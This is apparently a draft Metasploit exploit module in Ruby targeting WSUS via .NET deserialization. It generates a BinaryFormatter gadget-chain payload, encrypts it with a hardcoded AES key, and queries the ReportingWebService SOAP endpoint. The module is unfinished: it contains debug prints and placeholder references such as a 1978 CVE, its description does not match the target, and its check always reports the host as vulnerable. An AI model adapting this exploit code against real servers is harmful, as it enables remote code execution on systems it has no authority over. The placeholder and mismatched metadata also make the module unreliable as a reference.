##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'pry'
require 'pry-byebug'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking 

  include Exploit::Remote::HttpClient
  include Msf::Util::DotNetDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Server Update Service Deserialization Remote Code Execution',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in an TCP server that has a parsing bug.
        },
        'License' => MSF_LICENSE,
        'Author' => ['skape'],
        'References' => [
          [ 'OSVDB', '12345' ],
          [ 'EDB', '12345' ],
          [ 'URL', 'http://www.example.com'],
          [ 'CVE', '1978-1234']
        ],
        'Arch' => ARCH_CMD,
        'Platform' => 'win',
        'Targets' => [
          [ 'Windows', {}]
        ],
        'DisclosureDate' => '2020-12-30',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget' => 0,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def nonzero_random_bytes(len)
    bytes = ''
    while bytes.bytesize < len
      c = OpenSSL::Random.random_bytes(1)
      bytes << c unless c == "\x00"
    end
    bytes
  end

  # partially borrowed from shiro_rememberme_v124_deserialize.rb
  def aes_encrypt(_payload)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.encrypt
    aes.key = Rex::Text.decode_base64('h3wU5DNjgUWtIb0MFzkwcQ==')
    aes.iv = "\x00" * 16
    aes.padding = 0

    salt = nonzero_random_bytes(16)

    block_size = aes.block_size
    num = _payload.bytesize % block_size
    num2 = _payload.bytesize - num

    head = _payload.byteslice(0, num2).to_s

    tail_src = _payload.byteslice(num2, num).to_s
    padded_block = tail_src.ljust(block_size, "\x00")

    result = aes.update(salt)
    result << aes.update(head)
    result << aes.update(padded_block)
    result << aes.final

    result
  end

  def get_server_id
    soap_body = %Q<<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetRollupConfiguration xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
</GetRollupConfiguration>
</soap:Body>
</soap:Envelope>>

    res = send_request_cgi({
      'uri' => normalize_uri('ReportingWebService', 'ReportingWebService.asmx'),
      'method' => 'POST',
      'headers' => {
        'SOAPAction' => 'http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration'
      },
      'ctype' => 'text/xml',
      'data' => soap_body
    })
    
    # TODO: add check
    xml = res.get_xml_document
    
    server_id = xml.xpath('//ServerId')
    puts "here"
    puts server_id
    puts xml
    puts xml.search("//ServerId")

  end

  def enc_payload
    dotnet_payload = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    puts(dotnet_payload)
    aes_encrypt(dotnet_payload)
  end

  def check
    CheckCode::Vulnerable
  end

  def exploit
    get_server_id
  end
end
